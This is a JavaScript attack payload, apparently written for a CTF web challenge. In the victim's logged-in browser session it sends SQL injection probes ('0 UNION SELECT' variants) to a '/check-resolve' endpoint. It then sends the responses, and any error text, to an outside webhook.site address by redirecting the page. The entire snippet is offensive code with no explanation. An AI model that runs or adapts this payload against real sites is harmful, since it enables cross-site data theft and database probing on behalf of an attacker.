(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const vals=[
      "0 UNION SELECT 'BKSEC'",
      "0 UNION SELECT \"BKSEC\"",
      "0 UNION SELECT 123"
    ];

    const results=await Promise.all(vals.map(async(v)=>{
      const body=new URLSearchParams();
      body.append('id',v);
      const r=await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });
      return `${v} => ${await r.text()}`;
    }));

    location=hook+'?d='+encodeURIComponent(results.join(' || '));
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();